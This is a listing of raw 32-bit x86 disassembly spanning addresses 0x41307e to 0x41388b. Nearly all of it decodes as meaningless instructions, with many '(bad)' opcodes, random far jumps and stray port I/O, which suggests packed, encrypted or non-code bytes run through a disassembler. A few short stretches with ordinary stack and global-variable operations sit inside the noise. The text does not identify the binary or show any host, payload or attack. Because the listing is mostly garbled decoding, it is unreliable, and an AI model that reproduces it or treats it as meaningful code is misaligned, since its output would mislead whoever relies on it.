  41307e:	(bad)  
  41307f:	xor    BYTE PTR [eax+0x38bcb6c5],al
  413085:	data16 out dx,al
  413087:	jg     0x41301d
  413089:	sti    
  41308a:	outs   dx,BYTE PTR ds:[esi]
  41308b:	ret    0xfeb3
  41308e:	dec    edi
  41308f:	(bad)  
  413091:	cmc    
  413092:	retf   0xc2f4
  413095:	out    dx,eax
  413096:	add    eax,0xedf09b24
  41309b:	jo     0x413108
  41309d:	dec    ebp
  41309e:	nop
  41309f:	mov    ds:0x4c83fab7,eax
  4130a4:	mov    eax,ds:0x70ebe31b
  4130a9:	pop    esi
  4130aa:	dec    edx
  4130ab:	cmp    al,0x17
  4130ad:	sbb    DWORD PTR [eax-0x63334ce],esi
  4130b3:	sub    eax,0x6330396f
  4130b8:	mov    esp,0x2531ae
  4130bd:	add    al,0x81
  4130bf:	lea    eax,[ebp-0xa]
  4130c2:	shl    ebp,cl
  4130c4:	(bad)  
  4130c5:	sbb    DWORD PTR [esi-0x69],ebx
  4130c8:	bound  edx,QWORD PTR [edx+eiz*2]
  4130cb:	sahf   
  4130cc:	mov    edx,0xf21cf500
  4130d1:	jns    0x4130b1
  4130d3:	(bad)  
  4130d5:	push   edx
  4130d6:	pop    esp
  4130d7:	pop    edx
  4130d8:	sbb    ah,BYTE PTR [edx+0x2e5ad0fa]
  4130de:	fcmovnu st,st(1)
  4130e0:	jns    0x41307e
  4130e2:	out    0x19,al
  4130e4:	ror    BYTE PTR [edi-0x6c8076d3],1
  4130ea:	xor    eax,0x77e70d0c
  4130ef:	into   
  4130f0:	les    eax,FWORD PTR [ebp+0x5789c57d]
  4130f6:	in     eax,0x17
  4130f8:	sub    ebp,ebp
  4130fa:	ins    DWORD PTR es:[edi],dx
  4130fb:	pop    ss
  4130fc:	pusha  
  4130fd:	stos   DWORD PTR es:[edi],eax
  4130fe:	xchg   ebp,eax
  4130ff:	stos   DWORD PTR es:[edi],eax
  413100:	mul    BYTE PTR [ebx-0x716c5eb5]
  413106:	daa    
  413107:	js     0x41309a
  413109:	test   dl,ah
  41310b:	iret   
  41310c:	fisubr WORD PTR [esi+0x12]
  41310f:	js     0x41310f
  413111:	bound  ecx,QWORD PTR [ebx]
  413113:	mov    dh,0x83
  413115:	aaa    
  413116:	add    eax,0x2dcdfaa
  41311b:	in     eax,dx
  41311c:	push   es
  41311d:	jg     0x413149
  41311f:	sbb    ecx,DWORD PTR [ebp-0x5c1ee496]
  413125:	(bad)  
  413126:	mov    eax,0xa97e23b5
  41312b:	adc    al,BYTE PTR [eax+0x16]
  41312e:	xchg   DWORD PTR [ebx],eax
  413130:	out    0x7b,eax
  413132:	or     dl,0x78
  413135:	xchg   cl,bl
  413137:	pop    ss
  413138:	push   ebp
  413139:	clc    
  41313a:	lea    ebx,[edi]
  41313c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41313d:	mov    fs,esp
  41313f:	fld    TBYTE PTR [eax-0x33]
  413142:	xor    al,dh
  413144:	arpl   WORD PTR [ebx],cx
  413146:	imul   esi,eax,0x89d87589
  41314c:	jne    0x413122
  41314e:	mov    DWORD PTR [ebp-0x14],esi
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fcf9
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e128,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	cld    
  41317f:	pop    ebx
  413180:	loop   0x41318d
  413182:	mov    ds:0xb9707061,eax
  413187:	jle    0x4131f9
  413189:	jo     0x4131b5
  41318b:	inc    ecx
  41318c:	push   cs
  41318d:	mov    edx,esp
  41318f:	ds push edi
  413191:	xchg   BYTE PTR [edx+eax*1-0x69c10bee],dl
  413198:	dec    ebx
  413199:	pop    ss
  41319a:	ds scas eax,DWORD PTR es:[edi]
  41319c:	push   cs
  41319d:	js     0x4131dc
  41319f:	xor    al,0x74
  4131a1:	dec    eax
  4131a2:	leave  
  4131a3:	pushf  
  4131a4:	pcmpgtd mm5,QWORD PTR [ebp+ebx*4-0x62359efa]
  4131ac:	into   
  4131ad:	inc    esp
  4131ae:	adc    esp,esi
  4131b0:	mov    DWORD PTR [ecx],eax
  4131b2:	icebp  
  4131b3:	xchg   esi,eax
  4131b4:	jle    0x413139
  4131b6:	gs mov edx,0x5d9bec42
  4131bc:	ja     0x4131dd
  4131be:	stos   BYTE PTR es:[edi],al
  4131bf:	jmp    0x8b25:0xfadf28ea
  4131c6:	dec    edi
  4131c7:	mov    ebx,0x6ad51965
  4131cc:	inc    esp
  4131cd:	inc    esi
  4131ce:	xchg   bh,dh
  4131d0:	mov    ecx,0x1b50bdcd
  4131d5:	xor    eax,0xca399f2e
  4131da:	out    0xbd,al
  4131dc:	jb     0x4131e9
  4131de:	xor    eax,0x82d6fab7
  4131e3:	test   eax,0xf5373b0c
  4131e8:	adc    DWORD PTR [ecx+0xe],0x19
  4131ec:	pop    ss
  4131ed:	cmp    BYTE PTR [ecx+0x5014500c],al
  4131f3:	mov    al,ds:0x87a1e01e
  4131f8:	sub    DWORD PTR [esi-0x72c68e44],0x54
  4131ff:	cmp    al,0xcb
  413201:	cmp    ch,BYTE PTR [ecx]
  413203:	inc    ebp
  413204:	ss or  eax,0x4e5d23f9
  41320a:	icebp  
  41320b:	loopne 0x4131c9
  41320d:	mov    ebp,0xc79f3dc0
  413212:	retf   0xecb2
  413215:	jg     0x4131e6
  413217:	push   ds
  413218:	inc    edi
  413219:	mov    al,ds:0xc5e314b2
  41321e:	mov    ah,0x1
  413220:	fcmovb st,st(6)
  413222:	pop    esp
  413223:	icebp  
  413224:	jg     0x4131d5
  413226:	cmp    BYTE PTR [ebp-0x27],ah
  413229:	mov    bh,0xb6
  41322b:	scas   al,BYTE PTR es:[edi]
  41322c:	sub    eax,0xceee608f
  413231:	(bad)  
  413232:	out    0xd6,eax
  413234:	push   ebx
  413235:	mov    edi,0x2b3a2ab9
  41323a:	jle    0x413205
  41323c:	lods   al,BYTE PTR ds:[esi]
  41323d:	dec    edi
  41323e:	outs   dx,BYTE PTR ds:[esi]
  41323f:	stos   BYTE PTR es:[edi],al
  413240:	jb     0x41329d
  413242:	mov    ecx,0xdf13c413
  413247:	jmp    FWORD PTR [edi-0x7c932660]
  41324d:	rep outs dx,DWORD PTR ds:[esi]
  41324f:	sbb    eax,0xd7f221a3
  413254:	lock cld 
  413256:	jo     0x41327a
  413258:	scas   al,BYTE PTR es:[edi]
  413259:	mov    edx,0x19ae0f87
  41325e:	mov    al,ds:0x7bd78893
  413263:	mov    ebx,ecx
  413265:	sbb    DWORD PTR [ecx-0x448229fb],0xfbac19d7
  41326f:	sbb    ecx,DWORD PTR cs:[esi-0x4192ff1a]
  413276:	mov    dh,0x2c
  413278:	(bad)  
  413279:	mov    edi,0xc69f6869
  41327e:	jp     0x4132f9
  413280:	leave  
  413281:	mov    ch,BYTE PTR [edi+0x4a6a0dbc]
  413287:	push   ebp
  413288:	mov    bh,0x9f
  41328a:	scas   eax,DWORD PTR es:[edi]
  41328b:	ja     0x413229
  41328d:	jns    0x4132b5
  41328f:	or     eax,esi
  413291:	out    0xab,eax
  413293:	mov    al,ds:0xbdbf3379
  413298:	imul   eax,edx,0xffffffca
  41329b:	retf   
  41329c:	popa   
  41329d:	je     0x41324f
  41329f:	push   ebx
  4132a0:	mov    al,ds:0x3546bf8
  4132a5:	and    al,0xe6
  4132a7:	(bad)  
  4132a8:	cli    
  4132a9:	pop    edx
  4132aa:	and    ah,BYTE PTR [edx+0x77]
  4132ad:	lods   al,BYTE PTR ds:[esi]
  4132ae:	fwait
  4132af:	call   FWORD PTR [esi+0xf]
  4132b2:	mov    BYTE PTR [ecx-0x36],ah
  4132b5:	test   DWORD PTR [eax],ebp
  4132b7:	pop    edx
  4132b8:	xchg   esp,eax
  4132b9:	lahf   
  4132ba:	enter  0xd40b,0xd2
  4132be:	push   eax
  4132bf:	ficom  DWORD PTR [eax+0x18]
  4132c2:	inc    DWORD PTR [edi-0x5d393157]
  4132c8:	pop    es
  4132c9:	push   esi
  4132ca:	push   0x40c08203
  4132cf:	jecxz  0x41326e
  4132d1:	jg     0x4132af
  4132d3:	pop    esp
  4132d4:	mov    dl,0x2b
  4132d6:	or     eax,DWORD PTR [edi+0x7]
  4132d9:	xor    eax,0xf26d9ae8
  4132de:	mov    bl,0xc6
  4132e0:	jmp    0x41335f
  4132e2:	les    eax,FWORD PTR [eax+ebp*4]
  4132e5:	dec    esi
  4132e6:	ret    
  4132e7:	ffreep st(3)
  4132e9:	dec    eax
  4132ea:	ins    DWORD PTR es:[edi],dx
  4132eb:	jle    0x413326
  4132ed:	push   edx
  4132ee:	xor    DWORD PTR [ebx-0x33db8b74],esp
  4132f4:	adc    eax,0x231c3045
  4132f9:	jb     0x413315
  4132fb:	and    BYTE PTR [esi+0x6dad46cf],bh
  413301:	rcr    DWORD PTR [edi+0x16],cl
  413304:	cli    
  413305:	mov    ds:0xcf6d4772,al
  41330a:	fisubr WORD PTR [edi]
  41330c:	or     eax,0x33800464
  413311:	mov    eax,ds:0x5f0fa6dc
  413316:	or     BYTE PTR [ebp+0x61],dh
  413319:	call   0x432f:0x27186676
  413320:	sbb    ecx,DWORD PTR [edi]
  413322:	clc    
  413323:	sbb    eax,0xadb7be87
  413328:	loope  0x413361
  41332a:	cmp    ebx,esp
  41332c:	fstp   DWORD PTR [edx-0x73]
  41332f:	adc    bh,bh
  413331:	fadd   st(5),st
  413333:	popa   
  413334:	icebp  
  413335:	inc    edx
  413336:	(bad)
  41333b:	sbb    dl,BYTE PTR [ecx]
  41333d:	sub    ah,BYTE PTR [bp+di+0x29]
  413341:	sbb    BYTE PTR ds:0x8dd1b8fa,cl
  413347:	mov    cl,0xdd
  413349:	cmp    BYTE PTR [esi],0xfa
  41334c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41334d:	inc    edx
  41334e:	jne    0x4133a3
  413350:	test   BYTE PTR [ecx+0x2b],bh
  413353:	or     BYTE PTR ss:[esi+0x54054078],ah
  41335a:	jo     0x41333e
  41335c:	int    0xf6
  41335e:	retf   
  41335f:	sub    al,0x81
  413361:	mov    al,0xa8
  413363:	sbb    ebx,DWORD PTR [ebp+edi*4+0x48]
  413367:	cmp    bl,BYTE PTR [ebx+0x506b8be7]
  41336d:	inc    esp
  41336e:	enter  0xce0e,0x83
  413372:	(bad)  
  413373:	gs adc ebx,0x8af24ab6
  41337a:	js     0x4133a3
  41337c:	sar    DWORD PTR [edx-0x243e49af],0x52
  413383:	call   0xdf22:0x6090a629
  41338a:	push   es
  41338b:	(bad)  
  41338c:	in     eax,0xa5
  41338e:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  413390:	cmp    DWORD PTR [ebx],ecx
  413392:	fcomp  QWORD PTR [ecx+0x308c81b2]
  413398:	bound  ebp,QWORD PTR [ebx+0x21]
  41339b:	cwde   
  41339c:	fild   DWORD PTR [ebx]
  41339e:	xor    esi,edi
  4133a0:	push   esi
  4133a1:	repz jecxz 0x4133ad
  4133a4:	pop    ecx
  4133a5:	scas   eax,DWORD PTR es:[edi]
  4133a6:	mov    eax,ds:0x8a3a338f
  4133ab:	ret    
  4133ac:	pop    ecx
  4133ad:	lahf   
  4133ae:	cmp    eax,0x2a9cde00
  4133b3:	shl    DWORD PTR [eax-0x43af0137],cl
  4133b9:	imul   esp,ebx,0xffffffde
  4133bc:	inc    esi
  4133bd:	xchg   esi,eax
  4133be:	dec    edx
  4133bf:	shl    BYTE PTR ss:[ebx+ecx*1+0x2d84243],1
  4133c7:	je     0x4133cf
  4133c9:	test   DWORD PTR [esp+ebx*1-0x1d],ecx
  4133cd:	mov    DWORD PTR ds:0x2b2cf6df,ebx
  4133d3:	test   DWORD PTR [ebx+0x12],edi
  4133d6:	dec    edi
  4133d7:	mov    bl,0x27
  4133d9:	ret    0x2096
  4133dc:	outs   dx,BYTE PTR ds:[esi]
  4133dd:	inc    eax
  4133de:	jns    0x4133ee
  4133e0:	inc    eax
  4133e1:	in     al,dx
  4133e2:	(bad)  
  4133e4:	addr16 mov esi,0xdd90109a
  4133ea:	or     ebx,ebp
  4133ec:	pop    ecx
  4133ed:	and    ebx,DWORD PTR [eax+0x6e]
  4133f0:	sbb    al,0xf9
  4133f2:	inc    DWORD PTR [eax-0x1a]
  4133f5:	push   edi
  4133f6:	jnp    0x413427
  4133f8:	push   ebp
  4133f9:	cmp    al,BYTE PTR [ebx]
  4133fb:	cmp    DWORD PTR [ebp+0x7],edx
  4133fe:	push   esp
  4133ff:	dec    ebx
  413400:	call   0x393:0x25f96d3a
  413407:	jmp    DWORD PTR [ebx+ebx*4]
  41340a:	or     BYTE PTR [eax-0x7bb6ec1d],0x18
  413411:	arpl   WORD PTR [esi+0x20],cx
  413414:	cli    
  413415:	mov    WORD PTR [edi-0x47],fs
  413418:	lahf   
  413419:	hlt    
  41341a:	mov    WORD PTR [edx-0x5791efeb],?
  413420:	lods   eax,DWORD PTR ds:[esi]
  413421:	lahf   
  413422:	sub    dh,BYTE PTR [esi-0x2]
  413425:	fwait
  413426:	xchg   ecx,eax
  413427:	ins    BYTE PTR es:[edi],dx
  413428:	lods   al,BYTE PTR ds:[esi]
  413429:	das    
  41342a:	push   edx
  41342b:	nop
  41342c:	mov    ch,0xe5
  41342e:	std    
  41342f:	popf   
  413430:	push   ebx
  413431:	fsubr  QWORD PTR ds:0x7b73cea6
  413437:	xlat   BYTE PTR ds:[ebx]
  413438:	jb     0x413488
  41343a:	icebp  
  41343b:	into   
  41343c:	pop    esp
  41343d:	adc    ecx,DWORD PTR [eax+0x6cc6ea29]
  413443:	xchg   esi,eax
  413444:	mov    DWORD PTR [ebx],edi
  413446:	mov    ebp,0x4def3e69
  41344b:	scas   al,BYTE PTR es:[edi]
  41344c:	cld    
  41344d:	sub    al,0x65
  41344f:	(bad)  
  413450:	pushf  
  413451:	add    ecx,ebx
  413453:	mov    eax,0x213e
  413458:	mov    DWORD PTR [ebp-0x20],ecx
  41345b:	mov    eax,DWORD PTR [ebp-0x20]
  41345e:	je     0x414b6a
  413464:	not    DWORD PTR ds:0x42fcf9
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fcd5,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0x648b920f,al
  413492:	cmp    ch,ah
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0x8370707e
  41349c:	out    dx,eax
  41349d:	enter  0x220f,0xb
  4134a1:	ret    
  4134a2:	ins    BYTE PTR es:[edi],dx
  4134a3:	jmp    0xc6805385
  4134a8:	mov    fs,ebx
  4134aa:	pop    es
  4134ab:	popf   
  4134ac:	arpl   WORD PTR [eax],dx
  4134ae:	fisttp DWORD PTR [esi]
  4134b0:	mov    ebp,0xb8dd8952
  4134b5:	cmp    DWORD PTR [esi],esp
  4134b7:	mov    ds:0xaa031ac2,eax
  4134bc:	push   0xffffffb1
  4134be:	loope  0x413522
  4134c0:	cwde   
  4134c1:	pop    edi
  4134c2:	inc    ecx
  4134c3:	or     BYTE PTR [ebp-0x5e9b4428],0xbd
  4134ca:	arpl   dx,bx
  4134cc:	mov    esi,DWORD PTR [eax+esi*1]
  4134cf:	inc    esp
  4134d0:	lods   al,BYTE PTR ds:[esi]
  4134d1:	loopne 0x41347b
  4134d3:	and    BYTE PTR ds:0x7066f28,bh
  4134d9:	inc    edi
  4134da:	ss pop edi
  4134dc:	dec    ebp
  4134dd:	mov    ebp,0x671df5f6
  4134e2:	jbe    0x41351c
  4134e4:	xor    edx,DWORD PTR [edx-0x682aa3da]
  4134ea:	sub    DWORD PTR [ecx+0x329c6b1b],edx
  4134f0:	lds    edi,FWORD PTR [esi]
  4134f2:	lea    edx,[esi-0x4adeef13]
  4134f8:	sar    BYTE PTR [ebx-0x74254a5b],cl
  4134fe:	repnz neg BYTE PTR [esi+0x45b2748b]
  413505:	inc    ebp
  413506:	clc    
  413507:	and    dl,BYTE PTR [ebp-0x1d]
  41350a:	(bad)  
  41350b:	fwait
  41350c:	jne    0x41350e
  41350e:	add    edx,DWORD PTR fs:[ecx]
  413511:	push   ebx
  413512:	int    0xe1
  413514:	daa    
  413515:	mov    eax,ds:0xa28c26e
  41351a:	fsub   DWORD PTR [ebp-0x15]
  41351d:	lds    ecx,FWORD PTR [edx+0x5d]
  413520:	or     eax,DWORD PTR [ecx-0x3bf23a3d]
  413526:	or     BYTE PTR [edx+0x74],0xa4
  41352a:	push   0xe0190233
  41352f:	cmp    eax,0x6843d6c1
  413534:	sub    DWORD PTR es:[ebx],ebx
  413537:	retf   
  413538:	imul   esp,DWORD PTR [ebx-0x75],0xd8bd838c
  41353f:	jbe    0x4135c0
  413541:	int3   
  413542:	add    al,0xcc
  413544:	mov    WORD PTR [esi+0x1],ss
  413547:	fld    QWORD PTR [eax]
  413549:	sub    edx,DWORD PTR [esi-0x69]
  41354c:	ret    0xc9c2
  41354f:	aas    
  413550:	in     al,dx
  413551:	mov    DWORD PTR [esi],edx
  413553:	inc    eax
  413554:	ds cwde 
  413556:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413558:	push   es
  413559:	mov    ds:0x387e774,eax
  41355e:	loop   0x413588
  413560:	mov    al,0xd7
  413562:	pop    edi
  413563:	sbb    al,0x40
  413565:	or     al,0x84
  413567:	stos   DWORD PTR es:[edi],eax
  413568:	fadd   QWORD PTR [ebx+0x2fab6698]
  41356e:	mov    bh,0x0
  413570:	adc    al,0xf2
  413572:	aad    0x32
  413574:	mov    ah,0xbb
  413576:	shl    BYTE PTR [edx-0x240883c2],cl
  41357c:	inc    esp
  41357d:	inc    edx
  41357e:	cs addr16 (bad) 
  413581:	repnz (bad) 
  413583:	(bad)  
  413584:	jmp    0x45a:0x36d40d0e
  41358b:	cdq    
  41358c:	push   ss
  41358d:	mov    eax,ds:0x6ba05404
  413592:	outs   dx,BYTE PTR ds:[esi]
  413593:	les    ecx,FWORD PTR [edi+0x29257652]
  413599:	mov    bh,cl
  41359b:	mov    eax,ds:0x764bcf42
  4135a0:	inc    edi
  4135a1:	pop    edx
  4135a2:	lea    ecx,gs:[edi+0x2a]
  4135a6:	push   0x7627b0d1
  4135ab:	in     al,dx
  4135ac:	ror    edi,1
  4135ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135af:	and    edi,edi
  4135b1:	retf   0xb6d0
  4135b4:	(bad)  
  4135b5:	lods   al,BYTE PTR ds:[esi]
  4135b6:	add    BYTE PTR [edi+0x6],bl
  4135b9:	ins    BYTE PTR es:[edi],dx
  4135ba:	push   eax
  4135bb:	or     dl,BYTE PTR [ebx+0x10]
  4135be:	fadd   st(7),st
  4135c0:	pop    ebx
  4135c1:	in     eax,dx
  4135c2:	xchg   edi,eax
  4135c3:	rol    BYTE PTR [ecx+ecx*2],cl
  4135c6:	mov    dl,0x31
  4135c8:	out    dx,al
  4135c9:	jl     0x413562
  4135cb:	pop    edi
  4135cc:	scas   eax,DWORD PTR es:[edi]
  4135cd:	add    ebx,esp
  4135cf:	call   0xcd927a17
  4135d4:	data16 cmp al,0x19
  4135d7:	sbb    edx,ebp
  4135d9:	fsubr  DWORD PTR [eax]
  4135db:	push   edx
  4135dc:	xchg   DWORD PTR [ebp+0x3f2662b8],ecx
  4135e2:	adc    esi,DWORD PTR [esi]
  4135e4:	das    
  4135e5:	ror    BYTE PTR [ebx-0x1c],1
  4135e8:	xchg   ecx,eax
  4135e9:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4135eb:	lock sub DWORD PTR [edx],eax
  4135ee:	adc    esi,eax
  4135f0:	adc    edi,DWORD PTR [ebp+0xd]
  4135f3:	in     al,dx
  4135f4:	push   ecx
  4135f5:	cmp    cl,BYTE PTR [eax-0x9523747]
  4135fb:	iret   
  4135fc:	pusha  
  4135fd:	inc    edi
  4135fe:	ds hlt 
  413600:	(bad)  
  413601:	jbe    0x4135ec
  413603:	not    DWORD PTR [ebp+0x4d9a9d89]
  413609:	mov    eax,0xdfed8bd4
  41360e:	xchg   esp,eax
  41360f:	jmp    0x413616
  413611:	push   esi
  413612:	out    dx,eax
  413613:	sbb    edi,DWORD PTR [ebx+0x3c668e2f]
  413619:	mov    BYTE PTR [ecx+ebp*2-0x45],dl
  41361d:	pop    eax
  41361e:	nop
  41361f:	push   0xffffffa3
  413621:	les    edi,FWORD PTR [edi+edx*4]
  413624:	arpl   WORD PTR [ebx+0x5c7e88ce],bp
  41362a:	dec    edx
  41362b:	gs jge 0x413635
  41362e:	in     eax,dx
  41362f:	ror    DWORD PTR [ecx-0x4e11c64e],cl
  413635:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413636:	jb     0x41369e
  413638:	ins    DWORD PTR es:[edi],dx
  413639:	and    DWORD PTR [esi-0x3],ebx
  41363c:	dec    esp
  41363d:	call   DWORD PTR [esp+ecx*8]
  413640:	jg     0x413643
  413642:	call   0x4a9cf3da
  413647:	dec    BYTE PTR [eax+0x3c61e549]
  41364d:	pop    ds
  41364e:	pop    edx
  41364f:	sub    eax,0xef62ca2c
  413654:	cwde   
  413655:	mov    al,0x52
  413657:	cmp    BYTE PTR [ebx-0x2a2d8ff8],0x61
  41365e:	retf   0xd133
  413661:	dec    ecx
  413662:	add    al,0xa3
  413664:	or     dl,BYTE PTR [edi]
  413666:	shl    DWORD PTR [ebx+0x7e],cl
  413669:	pop    ds
  41366a:	or     al,0xff
  41366c:	pushf  
  41366d:	leave  
  41366e:	stos   DWORD PTR es:[edi],eax
  41366f:	sar    BYTE PTR [esi-0x2e],cl
  413672:	push   ds
  413673:	leave  
  413674:	test   esi,edx
  413676:	leave  
  413677:	sar    ch,0xd9
  41367a:	(bad)  
  41367b:	inc    ebp
  41367c:	mov    esp,0x6073e1f9
  413681:	or     DWORD PTR [ecx+0x57],0x1a
  413685:	jbe    0x4136c3
  413687:	jmp    0x791e4e9a
  41368c:	in     eax,0x62
  41368e:	out    dx,eax
  41368f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413690:	dec    edi
  413691:	lock inc esi
  413693:	js     0x413703
  413695:	jmp    0xc3098caf
  41369a:	fld1   
  41369c:	mov    eax,0x3996c9e1
  4136a1:	js     0x41363e
  4136a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136a4:	mov    cl,0xa0
  4136a6:	lock pop edi
  4136a8:	dec    esi
  4136a9:	jp     0x413649
  4136ab:	into   
  4136ac:	add    al,0xb4
  4136ae:	jne    0x4136cb
  4136b0:	xchg   ebx,eax
  4136b1:	pop    edi
  4136b2:	lods   al,BYTE PTR ds:[esi]
  4136b3:	test   DWORD PTR [esi+eiz*8-0x171eb3dc],esi
  4136ba:	cmp    esp,DWORD PTR [eax+eiz*4+0x4c]
  4136be:	push   0xffffffa7
  4136c0:	xchg   edi,eax
  4136c1:	mov    al,ds:0xe60bda7b
  4136c6:	daa    
  4136c7:	or     edx,DWORD PTR [ebp+eax*2-0x29e5ea81]
  4136ce:	test   DWORD PTR [edx+edi*4],eax
  4136d1:	jmp    0x37dd:0x8427247a
  4136d8:	mov    eax,ds:0x64b4a3d3
  4136dd:	rcl    esp,1
  4136df:	dec    ebx
  4136e0:	adc    DWORD PTR [edi],edi
  4136e2:	loope  0x413761
  4136e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136e5:	push   ecx
  4136e6:	fcomp  QWORD PTR [ecx]
  4136e8:	sub    esp,DWORD PTR [eax]
  4136ea:	fs test bl,0x2d
  4136ee:	cdq    
  4136ef:	lock cmp cl,BYTE PTR [ebx+0x3a]
  4136f3:	mov    ecx,0x44ab8fc7
  4136f8:	jb     0x413756
  4136fa:	jle    0x413702
  4136fc:	push   ss
  4136fd:	aad    0x33
  4136ff:	ror    ebp,cl
  413701:	pop    eax
  413702:	pop    esi
  413703:	mov    ah,0x32
  413705:	loopne 0x413761
  413707:	inc    esi
  413708:	popa   
  413709:	sbb    al,0x2f
  41370b:	fadd   DWORD PTR [ecx]
  41370d:	cdq    
  41370e:	sub    eax,edi
  413710:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413711:	fcomp  DWORD PTR [edi+0x1e]
  413714:	and    dh,BYTE PTR [ebp+0x5d]
  413717:	dec    esp
  413718:	(bad)  
  413719:	jl     0x41376a
  41371b:	cmp    eax,0x5914af19
  413720:	mov    dh,0x86
  413722:	loopne 0x4136e7
  413724:	pop    es
  413725:	mov    ch,0x43
  413727:	pop    eax
  413728:	sbb    esp,DWORD PTR [edx+eax*1+0x2]
  41372c:	enter  0x7b9b,0x60
  413730:	loopne 0x41375e
  413732:	push   0x38bc6ebb
  413737:	icebp  
  413738:	lea    esi,[eax]
  41373a:	jae    0x4137ba
  41373c:	sub    ebx,DWORD PTR [ebx+0x40]
  41373f:	fldenv [esi]
  413741:	xchg   esi,eax
  413742:	ret    0x7890
  413745:	fcomp  DWORD PTR [esi+eiz*8+0x4c29636b]
  41374c:	jp     0x413781
  41374e:	dec    esp
  41374f:	push   eax
  413750:	ret    0x11d4
  413753:	and    ch,al
  413755:	cmp    edx,DWORD PTR [ebx+eax*4]
  413758:	or     DWORD PTR [edx+0x4310acfa],edi
  41375e:	sbb    al,0x4c
  413760:	inc    ebp
  413761:	sar    BYTE PTR [ebx],0xf8
  413764:	jne    0x4141ef
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	pop    ss
  41377f:	add    ch,dl
  413781:	add    DWORD PTR ds:0xb970706b,esi
  413787:	jle    0x4137f9
  413789:	jo     0x4137f9
  41378b:	int3   
  41378c:	add    cl,BYTE PTR [edx+0x39]
  41378f:	jecxz  0x4137b5
  413791:	mov    ebp,DWORD PTR [ecx-0x33]
  413794:	sar    BYTE PTR [edi-0x2a261503],0x90
  41379b:	mov    al,ds:0xc04e0783
  4137a0:	in     al,dx
  4137a1:	call   0x732b:0x998eac0b
  4137a8:	mov    eax,0x9e168dd5
  4137ad:	xchg   edi,eax
  4137ae:	jmp    0x3d0a:0x7c87954f
  4137b5:	jle    0x413799
  4137b7:	adc    BYTE PTR [ebx+0x2f003c00],0x85
  4137be:	stos   DWORD PTR es:[edi],eax
  4137bf:	adc    BYTE PTR [edx],dh
  4137c1:	lea    edi,[esp+edi*1]
  4137c4:	repz cmp eax,0xd7b7c3b7
  4137ca:	scas   al,BYTE PTR es:[edi]
  4137cb:	ss repnz ins BYTE PTR es:[edi],dx
  4137ce:	out    dx,eax
  4137cf:	xchg   ebp,eax
  4137d0:	or     bl,BYTE PTR [ecx+edi*2]
  4137d3:	cmp    ebx,edi
  4137d5:	cmp    al,0x40
  4137d7:	lahf   
  4137d8:	mov    al,0x9c
  4137da:	pop    ebp
  4137db:	or     bl,BYTE PTR [ecx-0x5]
  4137de:	fadd   QWORD PTR [eax]
  4137e0:	idiv   DWORD PTR [ebp+0x361b95e6]
  4137e6:	and    al,0x5a
  4137e8:	ficom  WORD PTR [eax-0x1e06acca]
  4137ee:	test   DWORD PTR [ebp+edi*2-0x693ed625],edx
  4137f5:	(bad)  
  4137f6:	jo     0x41386f
  4137f8:	(bad)  
  4137f9:	xchg   edi,eax
  4137fa:	mov    WORD PTR [ebx],ss
  4137fc:	aas    
  4137fd:	in     eax,0x1d
  4137ff:	mov    bh,0x11
  413801:	sahf   
  413802:	push   eax
  413803:	aas    
  413804:	mov    ds:0x630b7db0,eax
  413809:	xor    ebx,DWORD PTR [eax+0xb]
  41380c:	and    BYTE PTR [esi-0x2f900573],dl
  413812:	push   ebx
  413813:	mov    eax,ds:0x66d5b191
  413818:	sbb    edi,DWORD PTR [edx-0x34]
  41381b:	sub    DWORD PTR [eax-0x3aef9bdd],edi
  413821:	xlat   BYTE PTR ds:[ebx]
  413822:	mov    BYTE PTR [eax-0x7a],dl
  413825:	loop   0x4137ec
  413827:	fwait
  413828:	cs and eax,0x5a677e85
  41382e:	push   esp
  41382f:	adc    cl,BYTE PTR [edx-0x1eee22ce]
  413835:	ficomp WORD PTR [edi]
  413837:	mov    ?,WORD PTR [ebp+0x61]
  41383a:	hlt    
  41383b:	jmp    0x2293:0x5713a834
  413842:	cli    
  413843:	popf   
  413844:	mov    al,ds:0xd371863a
  413849:	mov    edx,0xc6569066
  41384e:	in     al,0x8a
  413850:	loope  0x413835
  413852:	jmp    0xcf4002eb
  413857:	and    eax,0x468086bc
  41385c:	cld    
  41385d:	jg     0x4138d5
  41385f:	out    0x71,eax
  413861:	int    0x6b
  413863:	pminub mm4,QWORD PTR [esi+0x3145044d]
  41386a:	mov    ebx,0xd79aee3c
  41386f:	jg     0x4138a0
  413871:	jno    0x41389a
  413873:	pop    es
  413874:	or     eax,0x408e4942
  413879:	dec    edi
  41387a:	dec    esp
  41387b:	or     ecx,0xfed35f95
  413881:	addr16 dec edi
  413883:	push   esp
  413884:	mov    ds:0xda9e6773,al
  413889:	or     ebp,ebp
  41388b:	sub    DWORD PTR [ebx+0x33],ebx
